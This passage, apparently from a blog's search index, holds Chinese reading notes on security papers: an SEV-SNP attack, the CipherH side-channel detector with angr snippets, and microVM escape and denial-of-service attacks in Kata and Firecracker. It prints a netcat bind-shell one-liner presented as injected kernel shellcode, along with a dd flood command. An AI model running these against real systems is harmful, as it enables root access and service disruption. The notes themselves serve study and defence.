src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDVjNTY2Nzc5YzY4NjQ3MTNlMDUzMDQ4MTQzNTBlYmZfSEU2eGZZRHZLT1ZtNmMzQWVpTmlGNHpVNnZXWnpNNkZfVG9rZW46TjhqM2JwekJ3bzBJNGp4MVlDN2M0dGNCbjliXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p>绕过所有iptables的规则</p>\n<h3 id=\"Gaining-a-Root-Shell-in-the-SEV-SNP-VM\"><a href=\"#Gaining-a-Root-Shell-in-the-SEV-SNP-VM\" class=\"headerlink\" title=\"Gaining a Root Shell in the SEV-SNP VM\"></a>Gaining a Root Shell in the SEV-SNP VM</h3><p>利用kernel API：call_usermodehelper</p>\n<p>以root权限创建一个用户态进程，参数为：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">/bin/bash -c rm /tmp/t; mknod /tmp/t p;</span><br><span class=\"line\">/bin/sh 0&lt;/tmp/t \\| nc -ln 8001 1&gt;/tmp/t</span><br></pre></td></tr></table></figure>\n\n<p>创建一个root shell并通过8001端口向外通信</p>\n<p>作者将这段逻辑构造为shellcode （392bytes）并注入到icmp_rcv中，可以通过ping触发</p>\n<p>暂时无法在飞书文档外展示此内容</p>\n<h2 id=\"Evaluation\"><a href=\"#Evaluation\" class=\"headerlink\" title=\"Evaluation\"></a>Evaluation</h2><h3 id=\"Setup\"><a href=\"#Setup\" class=\"headerlink\" title=\"Setup\"></a>Setup</h3><ul>\n<li>SEV-SNP</li>\n<li>Linux kernel v6.5.0</li>\n<li>Ubuntu 20.04.6 LTS</li>\n<li>QEMU v8.0.0</li>\n</ul>\n<h3 id=\"Primitives\"><a href=\"#Primitives\" class=\"headerlink\" title=\"Primitives\"></a>Primitives</h3><ul>\n<li>216450 instruction skips&#x2F;s </li>\n<li>9.25 memory reads&#x2F;s</li>\n<li>8.95 memory writes&#x2F;s</li>\n</ul>\n<h3 id=\"Case-studies-1\"><a href=\"#Case-studies-1\" class=\"headerlink\" title=\"Case studies\"></a>Case studies</h3><p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NDAxNmM3ZTg1MjljMGNlMTMzZmNlMTI2NmRlNjc3ZTBfd0U2alJKZnFXUVh3RGs5dVlOZWpCTEt2MGNObU1UVWhfVG9rZW46UXNHOGI0WGdHb0xNNkp4TG13SWNLWDEybndjXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p>分别需要5.97 0.36 8.1s</p>\n<h2 id=\"Defense\"><a href=\"#Defense\" class=\"headerlink\" title=\"Defense\"></a>Defense</h2><p><a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e3ef461af35a8c74f2f4ce6616491ddb355a208f\">x86&#x2F;sev: Harden #VC instruction emulation somewhat</a></p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YzM1ZTVlMzE1ZTIxZDcxMDMxMTkzNjZkZjQ4NDljNjFfQnhkN1BIdHFoVFRpbUtGcTg5dmxkNTU3UEpKcFh4NFZfVG9rZW46WFkzOWJBU3l6b2xtVHl4a3NRVGNBcVBDbjBnXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWFjYTcwY2I5MDNmMTkzMjRiMDE3MDYyYTUzZmQ2MzdfcjJZc3BPU1pwV1NYTUlOcWY3eG1mU0QzeXN5MlMyS0xfVG9rZW46S0tXMGJTVWFFb0tBRGN4WUh4WGN1MXAxbjRlXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA\" alt=\"img\"></p>\n","categories":["papers"]},{"title":"CipherH","url":"/2024/09/17/papers/cipherH/","content":"<h1 id=\"CipherH\"><a href=\"#CipherH\" class=\"headerlink\" title=\"CipherH\"></a>CipherH</h1><p><a href=\"https://github.com/Sen-Deng/CipherH/tree/master\">Sen-Deng&#x2F;CipherH at master (github.com)</a></p>\n<blockquote>\n<p>Recent works have illustrated the feasibility of launching ciphertext side-channel attacks against cryptographic libraries using the aforementioned threat model [33]. However, they primarily target manually identified program vulnerabilities. This work presents CIPHERH, a thorough and fully automated framework for identifying such vulnerabilities in production cryptographic libraries.  </p>\n</blockquote>\n<h2 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h2><p><strong>CIPHERLEAKS: Breaking Constant-time Cryptography on AMD SEV via the Ciphertext Side Channel</strong></p>\n<p><strong>A Systematic Look at Ciphertext Side Channels</strong></p>\n<p>VMSA page 物理地址不变  XEX</p>\n<ol>\n<li>建立寄存器密文&lt;-&gt;明文的映射 ：控制OVMF 的一个PEIM  触发NAE VC handler 同时观察rax明文和密文   需要可读</li>\n<li>得到需要攻击的代码页地址：清空所有page 的P bit  NPF的errorcode会知道是否是代码页 再根据寄存器是否变化判断是否是目标代码页</li>\n<li>以Open SSL rsa为例，bn_get_bits5的NPF可以正好从rax读到key的5bit 循环可以得到整个key</li>\n</ol>\n<p>缓解：</p>\n<ol>\n<li>减少会触发NAE导致建立映射的函数 但是治标不治本</li>\n<li>函数返回值rax高位加随机数</li>\n<li>用栈传递返回值或者其他寄存器</li>\n<li>函数不在一个新的page开始</li>\n</ol>\n<p>光防VMSA没用 任意memory都可以观察</p>\n<p>constant time swap可以防一些microarchitecture的side channel攻击 但是防不了比较密文</p>\n<p>例如nginx  先发http请求 触发 然后清空Pbit触发NPF  然后用single-step技术</p>\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><p>硬件防开销大</p>\n<p>cipherH 软件框架 为了让加密库开发者写完代码以后自己检查一遍</p>\n<blockquote>\n<p>As will be introduced in §5, CIPHERH explores a hybrid approach by using dynamic taint analysis (which is scalable and rapid) to collect functions tainted on an execution trace. Then, it performs static symbolic execution toward each tainted function, covering paths that are not on the dynamic trace.  </p>\n</blockquote>\n<p><strong>设计并不是很难 主要用了两个工具  2.3k代码</strong></p>\n<p>key是taint 访问的过程中 不可以有一块内存可以推断key是否变化 因为都是bit操作 或者n-bit操作 减少了熵</p>\n<ul>\n<li>DFSan  llvm</li>\n<li>angr SSP’16 二进制文件反编译  得到更多的寄存器访存信息  <a href=\"https://trevorsaudi.com/posts/symbolic_execution_angr_part1/\">Symbolic Execution with Angr - part 1 · Trevor Saudi</a></li>\n</ul>\n<p><a href=\"https://www.usenix.org/system/files/conference/ase18/ase18-paper_springer.pdf\">ase18-paper_springer.pdf (usenix.org)</a></p>\n<p><a href=\"https://clang.llvm.org/docs/DataFlowSanitizer.html\">DataFlowSanitizer — Clang 19.0.0git documentation (llvm.org)</a></p>\n<p>编译优化等级开相同  根据函数名可以方便找到对应关系</p>\n<p>但还是有些信息不匹配的  所以第二阶段用保守方法处理</p>\n<h3 id=\"taint-analysis\"><a href=\"#taint-analysis\" class=\"headerlink\" title=\"taint analysis\"></a>taint analysis</h3><p>DFSan需要用他的API加到代码里 然后编译</p>\n<p>追踪数学运算、逻辑、内存访问 包括implicit</p>\n<p>手动识别secret并调API  hook每个函数调用 内存访问</p>\n<p>实际上secret就是RSA的一个私钥  传入最外层的函数之后 之后全可以通过自动分析得到 并不需要对算法库有修改</p>\n<p><a href=\"https://github.com/Sen-Deng/CipherH/blob/master/src/apps/wolfssl_case_study/test.c\">CipherH&#x2F;src&#x2F;apps&#x2F;wolfssl_case_study&#x2F;test.c at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>\n<p>这个阶段输出一系列函数   </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">get_digit_count:3</span><br><span class=\"line\">mp_rand:65</span><br><span class=\"line\">fp_invmod:1</span><br><span class=\"line\">fp_div_2:1</span><br><span class=\"line\">fp_exptmod:1</span><br><span class=\"line\">_fp_exptmod_ct:33</span><br><span class=\"line\">fp_montgomery_reduce:33</span><br><span class=\"line\">wc_RsaUnPad_ex:67</span><br><span class=\"line\">RsaUnPad:67</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a href=\"https://github.com/Sen-Deng/CipherH/blob/master/evaluation_result/wolfssl_rsa_o0/tainted_func.txt\">CipherH&#x2F;evaluation_result&#x2F;wolfssl_rsa_o0&#x2F;tainted_func.txt at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>\n<p>猜测最后的结果记录了函数名和对应的taint位置 包括6个参数寄存器、返回值、从内存加载</p>\n<ol>\n<li>任何输入 都是taint的</li>\n<li>返回值是taint</li>\n<li>从memory load了taint data</li>\n</ol>\n<p>对密码学算法库来说不需要构造很多覆盖面广的input  很多input其实涉及到的逻辑都一样</p>\n<p>不过其实筛掉大部分的function  然后留下function name和taint symbol name就可以了</p>\n<h3 id=\"符号执行\"><a href=\"#符号执行\" class=\"headerlink\" title=\"符号执行\"></a>符号执行</h3><p>符号执行阶段 从第一阶段拿到足够的信息以后 可以对每个function单独进行符号执行 if生成约束  然后根据taint信息生成一个表达式 求解</p>\n<p>因为这边不加混淆 所以代码应该比较容易被逆向 比如$0x10(rsp) 就可以认为是同一个指针</p>\n<p>syntactical equivalence   和angr现有的一样 保证效率</p>\n<h4 id=\"intra\"><a href=\"#intra\" class=\"headerlink\" title=\"intra\"></a>intra</h4><p>遇到if 加约束</p>\n<p>遇到call 直接用symbol  根据taint analysis的结果可以知道这里的symbol用普通的s还是taint的k</p>\n<p>M 中的元组a,v 表示symbol v写到地址a</p>\n<p>W中的元组a,v,i表示指令i把数据v写到地址a</p>\n<ol>\n<li>检查v是否包含key</li>\n<li>是否存在a1&#x3D;a 且v1也包含key</li>\n<li>放入Eq4看看是否可满足 (带上之前if导致的一系列条件)</li>\n<li>SMT solver返回是否可满足 并给出例子 留给user后续手动分析</li>\n</ol>\n<p><a href=\"https://github.com/Sen-Deng/CipherH/blob/master/src/run.py\">CipherH&#x2F;src&#x2F;run.py at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>\n<p>hook了每次内存读写的操作  回调的时候有当前所有的状态 包括这句内存读写操作的AST</p>\n<p>AST中包括symbol的表达式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">initial_state.inspect.b(<span class=\"string\">&#x27;instruction&#x27;</span>, action=track_instr)</span><br><span class=\"line\">initial_state.inspect.b(<span class=\"string\">&#x27;mem_write&#x27;</span>, when=angr.BP_BEFORE,action=track_write_mem_before)</span><br><span class=\"line\">initial_state.inspect.b(<span class=\"string\">&#x27;mem_read&#x27;</span>, when=angr.BP_BEFORE, action=track_read_mem_before)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> fun_name <span class=\"keyword\">in</span> tainted_func:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">128</span> == <span class=\"number\">128</span>:</span><br><span class=\"line\">    initial_state.regs.rdi = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">64</span> == <span class=\"number\">64</span>:</span><br><span class=\"line\">    initial_state.regs.rsi = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">32</span> == <span class=\"number\">32</span>:</span><br><span class=\"line\">    initial_state.regs.rdx = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>)           </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">16</span> == <span class=\"number\">16</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    initial_state.regs.rcx = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">8</span> == <span class=\"number\">8</span>:</span><br><span class=\"line\">    initial_state.regs.r8 = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">4</span> == <span class=\"number\">4</span>:</span><br><span class=\"line\">    initial_state.regs.r9 = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>) </span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">l = <span class=\"built_in\">len</span>(state.ch.chain)//<span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> l &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">    l = l - <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">1</span>] <span class=\"keyword\">is</span> state.inspect.mem_write_address:</span><br></pre></td></tr></table></figure>\n\n<p>四个一组 循环找 所以chain就是论文中的W和M</p>\n<p><a href=\"https://www.cnblogs.com/level5uiharu/p/16932453.html\">欢迎回来(。・∀・)ノ (cnblogs.com)</a></p>\n<p>这里chain和expr应该都是AST key要么在arg0要么在arg1 </p>\n<p>第一个条件是判断是否相等 第二个条件是判断换一个变量是否可以不等(把key换成另一个symbol)</p>\n<p>这里虽然名字都是sol 但实际上都是两个不同的symbol 比如sol_22 sol_23</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>  temp1 == <span class=\"string\">&#x27;__add__&#x27;</span> <span class=\"keyword\">and</span> temp2 ==  <span class=\"string\">&#x27;__add__&#x27;</span> :</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;k&#x27;</span> <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>].args[<span class=\"number\">0</span>]):</span><br><span class=\"line\">    \ttemp3 = state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>] - state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>].args[<span class=\"number\">0</span>] + state.solver.BVS(<span class=\"string\">&quot;sol&quot;</span>,  <span class=\"built_in\">int</span>(b))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">    \ttemp3 = state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>] - state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>].args[<span class=\"number\">1</span>] + state.solver.BVS(<span class=\"string\">&quot;sol&quot;</span>,  <span class=\"built_in\">int</span>(b))                                       </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;k&#x27;</span> <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(state.inspect.mem_write_expr.args[<span class=\"number\">0</span>]):</span><br><span class=\"line\">    \ttemp4 = state.inspect.mem_write_expr - state.inspect.mem_write_expr.args[<span class=\"number\">0</span>] + state.solver.BVS(<span class=\"string\">&quot;sol&quot;</span>,  <span class=\"built_in\">int</span>(b))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">    \ttemp4 = state.inspect.mem_write_expr - state.inspect.mem_write_expr.args[<span class=\"number\">1</span>] + state.solver.BVS(<span class=\"string\">&quot;sol&quot;</span>,  <span class=\"built_in\">int</span>(b))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> state.solver.satisfiable(extra_constraints=[state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>] == state.inspect.mem_write_expr, temp3 != temp4]):</span><br><span class=\"line\">    \t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;bug in &#123;&#125; for &#123;:x&#125; and &#123;:x&#125;&quot;</span>.<span class=\"built_in\">format</span>(fun_name, state.ch.chain[<span class=\"number\">4</span>*l], state.inspect.instruction), file=f_result)                     </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里等号的含义是，是否存在某一组symbol的组合(k1 k2 k3 k4) 使得取值可以相等(64bit整数)</p>\n<p>W1 W2应该表示连续两次读 (i变i+1 或f前和f后)</p>\n<p><strong>ch.chain和inspect.mem_write_expr</strong>是什么？  好像后者就是前者的4l+2?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">state.ch.chain = state.ch.chain + [state.inspect.instruction]</span><br><span class=\"line\">state.ch.chain = state.ch.chain + [state.inspect.mem_write_address]</span><br><span class=\"line\">a = <span class=\"built_in\">str</span>(state.inspect.mem_write_expr)</span><br><span class=\"line\">b = a[<span class=\"number\">3</span>:<span class=\"number\">5</span>]</span><br><span class=\"line\">state.ch.chain = state.ch.chain + [b]</span><br><span class=\"line\">state.ch.chain = state.ch.chain + [state.inspect.mem_write_expr]</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><a href=\"https://github.com/Sen-Deng/CipherH/blob/master/evaluation_result/wolfssl_rsa_o0/symbolic_exec/result.txt\">CipherH&#x2F;evaluation_result&#x2F;wolfssl_rsa_o0&#x2F;symbolic_exec&#x2F;result.txt at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>\n<p>这个地址应该就是二进制文件里面的地址 非常精确 供之后手动分析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bug in fp_rshb for 41cc2a and 41cc2a</span><br><span class=\"line\">bug in fp_rshb for 41cc63 and 41cc63</span><br><span class=\"line\"></span><br><span class=\"line\">bug in _fp_exptmod_ct for 41ee25 and 41ee5c</span><br><span class=\"line\">bug in _fp_exptmod_ct for 41ee4b and 41ee4b</span><br><span class=\"line\">bug in _fp_exptmod_ct for 41ee5c and 41ee5c</span><br><span class=\"line\">bug in _fp_exptmod_ct for 41f04b and 41f04b</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"inter\"><a href=\"#inter\" class=\"headerlink\" title=\"inter\"></a>inter</h4><p>同一块内存会在函数调用间被写</p>\n<ul>\n<li>频繁调用</li>\n<li>callee至少一个参数是tainted</li>\n</ul>\n<p>没有加约束求解 所以可能带来false positives</p>\n<blockquote>\n<p>In all, during our intra-procedural analysis, we use symbolic execution to traverse each path of a tainted function Fc. During the traversal, we search for every encountered callee function and decide if any callee function F meets the aforementioned patterns. If so, we will proceed further to launch intra-procedural symbolic execution toward F, and decide if F has memory write instructions whose content is derived from its tainted parameters. If so, we would conclude that F enables ciphertext side channels, assuming multiple runs of F from Fc write secrets into the same memory address.  </p>\n</blockquote>\n<p>只要callee F用taint 写了内存就认为会带来side channel</p>\n","categories":["papers"]},{"title":"Operation Forwarding","url":"/2024/09/17/papers/forward/","content":"<h1 id=\"Operation-Forwarding\"><a href=\"#Operation-Forwarding\" class=\"headerlink\" title=\"Operation Forwarding\"></a>Operation Forwarding</h1><p>usenix security23</p>\n<p>虽然使用硬件虚拟化进行了隔离 但是microVM使用的组件还是会涉及到使用host的资源</p>\n<p>策略1 container components</p>\n<ul>\n<li>kata container 用viriofs 提供rootfs 使得guest在这个文件夹的操作会转发到host</li>\n<li>firecracker用runc jailer先在host上创建文件夹 然后复制文件 作为rootfs 使得host普通用户可以通过创建microVM利用containerd的漏洞做坏事</li>\n</ul>\n<blockquote>\n<p>however, virtiofs is designed to offer local file system semantics and high performance. The file system performance downgrades without virtiofs in Kata Containers   </p>\n</blockquote>\n<p>用这个是为了性能</p>\n<p>策略2 device emulator</p>\n<p>策略3 host kernel module</p>\n<h2 id=\"1-kata-container-virtiofs\"><a href=\"#1-kata-container-virtiofs\" class=\"headerlink\" title=\"1 kata container virtiofs\"></a>1 kata container virtiofs</h2><ol>\n<li><p>container 在virtiofs的共享文件夹下创建SGIDbit的可执行文件  SGID可以临时获得程序所属组的权限</p>\n</li>\n<li><p>guest的virtiofs-driver会把open的system call forward给host的virtiofs daemon</p>\n</li>\n<li><p>通过host创建文件的权限检查 因为virfiofs daemon有root为 supplemental group</p>\n<blockquote>\n<p>Then it checks if the creation process has the same supplemental group as the directory owner. However, according to the virtiofs daemon’s document [31], virtiofs daemon must run as the root user and has the root group in its supplemental group  </p>\n</blockquote>\n</li>\n<li><p>成功在host的某个目录下创建一个SGID的可执行文件</p>\n</li>\n</ol>\n<p>vm内部和host是两个世界，所以这里无论怎么样vm还是无法利用这个可执行文件完成逃逸的。但是这个文件为host留了隐患，在host同一物理机器的任何普通用户都可以以root权限执行这个可执行文件。</p>\n<blockquote>\n<p>a regular user can get the host root group privileges when executing the file created by the malicious container.  </p>\n</blockquote>\n<p>cve的描述:</p>\n<blockquote>\n<p> This could allow a malicious unprivileged user inside the guest to gain access to resources accessible to the root group, potentially escalating their privileges within the guest. A malicious local user in the host might also leverage this unexpected executable file created by the guest to escalate their privileges on the host system.</p>\n</blockquote>\n<ol>\n<li>guest内部的非root用户有root权限</li>\n<li>host的非root用户有root权限</li>\n</ol>\n<p>报告给viriofs CVE 修复：取消掉viriofs 的root group</p>\n<p><a href=\"https://lists.nongnu.org/archive/html/qemu-devel/2022-01/msg05364.html\">https://lists.nongnu.org/archive/html/qemu-devel/2022-01/msg05364.html</a></p>\n<p>这个patch是qemu的virtiofsd  直接在启动的一开始把这个进程的所有supplemental group 都清空了 </p>\n<p>一个用户可以属于多个组 但是登录的时候默认是primary group</p>\n<p>其他组都是supplemental group</p>\n<blockquote>\n<p>If we have membership of “root” supplementary group</p>\n</blockquote>\n<p>root group是不是只是一个形象的表达？ 实际上只有adm sudo这种group</p>\n<p>如果viriofs共享的文件夹是root 那么清空了virtiofsd的root supplemental group virtiofsd本身还怎么提供服务？最早为什么必须加？涉及到viriofs的设计 不深入研究</p>\n<p><strong>利用open  策略1</strong></p>\n<h2 id=\"2-kata-container-dirty-memory-attack\"><a href=\"#2-kata-container-dirty-memory-attack\" class=\"headerlink\" title=\"2 kata container dirty memory attack\"></a>2 kata container dirty memory attack</h2><ol>\n<li>container中<code>dd if=/dev/zero of=/mnt/test bs=1M count=4096 oflag=direct  </code>持续生成 写文件</li>\n<li>viriofs共享文件夹写write  VFS-&gt;viriofs driver-&gt;host viriofs daemon 触发host写 影响host dirty memory</li>\n<li>linux kernel 维护一个值 当dirty memory超过阈值后(20%) 所有进程的写操作会从write-back变成write-through 性能下降</li>\n<li>当多个container做这种操作 host的io性能可以下降90%</li>\n</ol>\n<p><strong>利用write 策略1</strong></p>\n<blockquote>\n<p>Besides, one can limit dirty memory usage of the virtiofs by adding the virtiofs daemon into cgroups.  </p>\n</blockquote>\n<p>virtiofs daemon就一个 给哪个vm的cgroup？</p>\n<p>virtiofs团队正在努力让virtiofs daemon不需要以root运行 并且不影响用户使用</p>\n<p><strong>经过测试 当某个文件被删除后 这个文件的buffer 即所有的dirty page也会马上被清空 不会再占用内存 所以仅仅靠一个container是无法达成攻击的 需要多个container一起 例如10container*4G&gt;192G(server)*20%&#x3D;38.4G</strong></p>\n<p>多个container持续修改同一个文件即可 这样持续生成dirty memory</p>\n<p>dirty memory在代码中的定义：</p>\n<p><a href=\"https://www.cnblogs.com/gmpy/p/12657801.html\">Linux 脏数据回刷参数与调优 - 广漠飘羽 - 博客园 (cnblogs.com)</a></p>\n<p>可回收内存(FILE_DIRTY) &gt; 可用内存(FREE+INACTIVE_FILE+ACTIVE_FILE) * ratio 发生回收 所以大量的匿名页是不记入的</p>\n<h2 id=\"3-kata-container-nf-conntrack-table-attack\"><a href=\"#3-kata-container-nf-conntrack-table-attack\" class=\"headerlink\" title=\"3 kata container nf_conntrack table attack\"></a>3 kata container nf_conntrack table attack</h2><ol>\n<li>container 疯狂connect 建立tcp连接</li>\n<li>host的vhost-net kernel module调用tun_sendmsg-&gt;nf_conntrack_alloc</li>\n<li>达到nf_conntrack_max 类似抽象资源攻击</li>\n<li>造成随机丢包   ping 50%丢包 nginx不可用</li>\n</ol>\n<p>这里应该攻击的就是最终使用nf_conntrack table的网络使用者 也就是同样使用vhost-net的其他容器</p>\n<p><strong>connect 策略3</strong></p>\n<p>kata不修复 就给了减弱攻击的做法</p>\n<p><a href=\"https://security.stackexchange.com/questions/43205/nf-conntrack-table-full-dropping-packet/43220#43220\">https://security.stackexchange.com/questions/43205/nf-conntrack-table-full-dropping-packet/43220#43220</a></p>\n<p>调一些参数 比如timeout max</p>\n<p>可以限制速率</p>\n<p><a href=\"https://lonesysadmin.net/2013/12/22/better-linux-disk-caching-performance-vm-dirty_ratio/\">https://lonesysadmin.net/2013/12/22/better-linux-disk-caching-performance-vm-dirty_ratio/</a></p>\n<h2 id=\"4-attack-of-vhost-net-kernel-module\"><a href=\"#4-attack-of-vhost-net-kernel-module\" class=\"headerlink\" title=\"4 attack of vhost-net kernel module\"></a>4 attack of vhost-net kernel module</h2><ol>\n<li>container 疯狂 sendmsg&#x2F;recvmsg</li>\n<li>kernel 疯狂handle_rx&#x2F;tx</li>\n<li>vhost kernel worker thread使用很多cpu资源 且不计入VM使用的资源</li>\n</ol>\n<p>并没有显示对其他container有影响</p>\n<blockquote>\n<p>Specifically, a worker thread called vhost-<owner-device-emulator-process-pid> is created for each virtual machine  </p>\n</blockquote>\n<p><strong>sendmsg&#x2F;recvmsg 策略3</strong></p>\n<p>每个VM一个 所以解决方案是把这些thread加入container的cgroup</p>\n<p>实际上对于kata container 有一个sandbox_cgroup_only&#x3D;true的选项可以让vhost thread放入cgroup 但是默认是false</p>\n<p>为什么这个可以让container的用户自己配置？ 那都是false不是不需要消耗资源付更多钱吗</p>\n<p>可以用SRIOV</p>\n<h2 id=\"5-firecracker-containerd-escalation\"><a href=\"#5-firecracker-containerd-escalation\" class=\"headerlink\" title=\"5  firecracker-containerd escalation\"></a>5  firecracker-containerd escalation</h2><p><a href=\"https://github.com/firecracker-microvm/firecracker-containerd/commit/95c43cdec1b5dc92a16a732b56f482218c2b5fed\">https://github.com/firecracker-microvm/firecracker-containerd/commit/95c43cdec1b5dc92a16a732b56f482218c2b5fed</a></p>\n<ol>\n<li><p>host 普通用户构造一个路径 申请创建microVM</p>\n</li>\n<li><p>firecracker-containerd是root权限运行 而代码中并没有检查参数所以涉及到的chown和create可以操作任何文件</p>\n<p>并且代码使用的filepath.join会导致组合的路径逃出jail</p>\n</li>\n<li><p>chown可以任意修改文件权限</p>\n<p>create可以任意清空文件，例如清空host的.so 让host crash</p>\n</li>\n</ol>\n<p><strong>CreateVM 策略1</strong></p>\n<p>“path&#x2F;filepath”  filepath.join 在某一个路径存在<code>/../../../</code>的情况下 最后组合的路径会把另一个前面的吃掉</p>\n<p>换成”github.com&#x2F;containerd&#x2F;continuity&#x2F;fs” fs.RootPath</p>\n<p>用户控制一个 可以逃出runc指定的jail路径</p>\n<p><strong>CreateVM 策略1</strong></p>\n<h2 id=\"6-firecracker-based-container-dirty-memory-attack\"><a href=\"#6-firecracker-based-container-dirty-memory-attack\" class=\"headerlink\" title=\"6 firecracker-based container dirty memory attack\"></a>6 firecracker-based container dirty memory attack</h2><p>类似kata container</p>\n<p>但是firecracker使用的是virio-blk</p>\n<p><strong>write 策略2</strong></p>\n<h2 id=\"7-Firecracker-based-Container-Nf-conntrack-TableAttack\"><a href=\"#7-Firecracker-based-Container-Nf-conntrack-TableAttack\" class=\"headerlink\" title=\"7 Firecracker-based Container Nf_conntrack TableAttack\"></a>7 Firecracker-based Container Nf_conntrack TableAttack</h2><p>用virtio-net device 而不是kernel module</p>\n<p>但是效果一样</p>\n<p><strong>connect 策略2</strong></p>\n<p>被AWS修复了  没找到怎么修复</p>\n<h2 id=\"8-KVM-PIT-Timer-Attack\"><a href=\"#8-KVM-PIT-Timer-Attack\" class=\"headerlink\" title=\"8 KVM PIT Timer Attack\"></a>8 KVM PIT Timer Attack</h2><ol>\n<li>guest疯狂写某写io port 触发PIT timer 且period很短</li>\n<li>host调度kvm-pit线程 pit_do_work往guest插入中断</li>\n<li>内核线程属于root cgroup 消耗资源不算在user space</li>\n<li>cpu memory io的benchmark性能都下降</li>\n</ol>\n<p>个人认为这里是server的资源并不多 并且开的container太多 导致消耗大量资源的PIT thread在整体可用资源的占比变高</p>\n<p><strong>outb 策略3</strong></p>\n<p>qemu用HPET代替了PIT 具体实现不深入研究</p>\n<p>也是一个VM一个 所以也可以放到cgroup中</p>\n<p>或者直接禁用</p>\n<h2 id=\"traditional-VM\"><a href=\"#traditional-VM\" class=\"headerlink\" title=\"traditional VM\"></a>traditional VM</h2><ul>\n<li>dirty memory dos有效</li>\n<li>nf_conntrack dos有效</li>\n<li>vhost-net 有效</li>\n<li>viriofs提权 有效 9pfs也有效</li>\n<li>PIT 不用了 所以无效</li>\n</ul>\n<p>这些漏洞存在 但是普通VM不一定用 microVM定死了组件 所以一定用</p>\n","categories":["papers"]},{"title":"TZ-LLM: Protecting On-Device Large Language Models with Arm TrustZone","url":"/2026/02/02/papers/TZ-LLM%20Protecting%20On-Device%20Large%20Language%20Models%20with%20Arm%20TrustZone/","content":"<h1 id=\"TZ-LLM-Protecting-On-Device-Large-Language-Models-with-Arm-TrustZone\"><a href=\"#TZ-LLM-Protecting-On-Device-Large-Language-Models-with-Arm-TrustZone\" class=\"headerlink\" title=\"TZ-LLM: Protecting On-Device Large Language Models with Arm TrustZone\"></a>TZ-LLM: Protecting On-Device Large Language Models with Arm 